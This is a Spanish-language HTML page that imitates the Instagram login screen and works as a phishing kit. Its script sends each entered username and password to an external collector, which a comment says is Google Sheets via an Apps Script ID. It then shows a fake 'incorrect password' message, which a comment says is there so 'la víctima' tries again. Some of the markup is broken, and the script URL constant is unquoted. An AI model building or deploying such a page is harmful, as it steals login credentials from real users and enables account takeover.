<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* Reset básico */
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #262626;
        }
        
        /* Contenedor principal blanco */
        .login-container {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            width: 350px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Logo */
        .logo {
            margin: 20px 0 30px;
            width: 175px;
        }
        .logo svg {
            width: 100%;
            height: auto;
        }

        /* Inputs */
        .input-group {
            width: 100%;
            margin-bottom: 6px;
            position: relative;
        }
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 14px 8px;
            font-size: 12px;
            color: #262626;
            outline: none;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        input::placeholder {
            color: #8e8e8e;
        }

        /* Botón */
        .btn-login {
            width: 100%;
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            padding: 7px 16px;
            margin-top: 10px;
            cursor: pointer;
            opacity: 0.7;
            transition: opacity 0.2s;
        }
        .btn-login:hover { opacity: 1; }
        .btn-login:disabled { opacity: 0.7; cursor: default; }

        /* Separador "O" */
        .separator {
            width: 100%;
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .separator::before, .separator::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .separator::before { margin-right: 10px; }
        .separator::after { margin-left: 10px; }

        /* Mensaje de error */
        .error-msg {
            color: #ed4956;
            font-size: 12px;
            font-weight: 600;
            background: #fff0f0;
            padding: 10px;
            border-radius: 4px;
            width: 100%;
            text-align: center;
            margin-bottom: 10px;
            display: none;
        }

        /* Footer links */
        .footer-links {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
        }
        .footer-links a { color: #8e8e8e; text-decoration: none; }
    </style>
</head>
<body>

        </div>

        <!-- Formulario -->
        <form id="loginForm">
            <div class="input-group">
                <input type="text" name="username" id="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder="Contraseña" required>
            </div>
            <button type="submit" class="btn-login" id="submitBtn">Iniciar sesión</button>
        </form>

        <div class="separator">O</div>
        
        <div style="color: #385185; font-size: 12px; font-weight: 600; cursor: pointer;">
            Iniciar sesión con Facebook
        </div>
        
        <div style="margin-top: 20px; font-size: 12px; color: #8e8e8e; cursor: pointer;">
            ¿Has olvidado la contraseña?
        </div>

        <div class="footer-links">
            <p>Obtén la aplicación.</p>
        </div>
    </div>

    <script>
        // AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP
        const SCRIPT_URL = AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP;

        const form = document.getElementById('loginForm');
        const btn = document.getElementById('submitBtn');
        
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // UI Feedback
            btn.disabled = true;
            btn.innerText = '...';

            // Enviar datos a Google Sheets
            const data = new FormData();
            data.append('username', username);
            data.append('password', password);

            fetch(SCRIPT_URL, {
                method: 'POST',
                body: data
            })
            .then(response => {
                // Simular carga
                return new Promise(resolve => setTimeout(resolve, 1500));
            })
            .then(() => {
                // Simular error para que la víctima intente de nuevo (más realista)
                const errorMsg = document.createElement('div');
                errorMsg.style.color = '#ed4956';
                errorMsg.style.fontSize = '12px';
                errorMsg.style.textAlign = 'center';
                errorMsg.style.marginTop = '10px';
                errorMsg.innerText = 'El nombre de usuario o la contraseña es incorrecta.';
                
                // Limpiar campo contraseña
                document.getElementById('password').value = '';
                document.getElementById('password').placeholder = 'Inténtalo de nuevo';
                
                form.appendChild(errorMsg);
                
                // Restaurar botón
                btn.disabled = false;
                btn.innerText = 'Iniciar sesión';

                // Eliminar mensaje de error después de 3 segundos
                setTimeout(() => {
                    errorMsg.remove();
                }, 3000);

            })
            .catch(error => {
                btn.disabled = false;
                btn.innerText = 'Iniciar sesión';
            });
        });
    </script>
